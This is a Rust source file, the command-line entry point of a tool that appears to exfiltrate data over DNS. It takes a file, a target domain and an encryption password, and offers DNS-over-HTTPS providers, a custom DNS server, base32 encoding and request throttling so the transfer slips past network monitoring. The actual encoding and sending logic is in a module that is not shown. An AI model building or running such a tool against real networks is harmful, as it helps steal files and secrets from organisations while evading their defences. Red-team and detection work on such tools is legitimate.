use std::path::PathBuf;
use clap::{Parser, ValueEnum};
use log::{error, LevelFilter};
use env_logger::Builder;
use crate::dns_exfiltrator::DNSExfiltrator;

mod error;
mod dns_exfiltrator;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// File to exfiltrate
    #[arg(value_name = "FILE")]
    file: PathBuf,

    /// Target domain name
    #[arg(value_name = "DOMAIN")]
    domain_name: String,

    /// Encryption password
    #[arg(value_name = "PASSWORD")]
    password: String,

    /// Use base32 encoding instead of base64
    #[arg(short, long)]
    base32: bool,

    /// DNS over HTTPS provider
    #[arg(short = 'H', long, value_enum)]
    doh_provider: Option<DoHProvider>,

    /// Custom DNS server
    #[arg(short, long)]
    dns_server: Option<String>,

    /// Throttle time in milliseconds between requests
    #[arg(short, long, default_value = "0")]
    throttle: u64,

    /// Maximum request size
    #[arg(short, long, default_value = "255")]
    request_size: usize,

    /// Maximum DNS label size
    #[arg(short, long, default_value = "63")]
    label_size: usize,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum DoHProvider {
    Google,
    Cloudflare,
}

impl ToString for DoHProvider {
    fn to_string(&self) -> String {
        match self {
            DoHProvider::Google => "google".to_string(),
            DoHProvider::Cloudflare => "cloudflare".to_string(),
        }
    }
}

fn main() {
    let args = Args::parse();

    // Setup logging
    let mut builder = Builder::new();
    builder.filter_level(if args.verbose {
        LevelFilter::Debug
    } else {
        LevelFilter::Info
    });
    builder.init();

    // Create and configure DNSExfiltrator
    let result = (|| -> error::Result<()> {
        let mut exfiltrator = DNSExfiltrator::new(args.domain_name, args.password)?;
        
        exfiltrator.set_options(
            args.base32,
            args.throttle,
            args.request_size,
            args.label_size,
        )?;

        exfiltrator.set_dns_options(
            args.doh_provider.map(|p| p.to_string()),
            args.dns_server,
        )?;

        exfiltrator.exfiltrate(&args.file)
    })();

    if let Err(e) = result {
        error!("Error: {}", e);
        std::process::exit(1);
    }
}
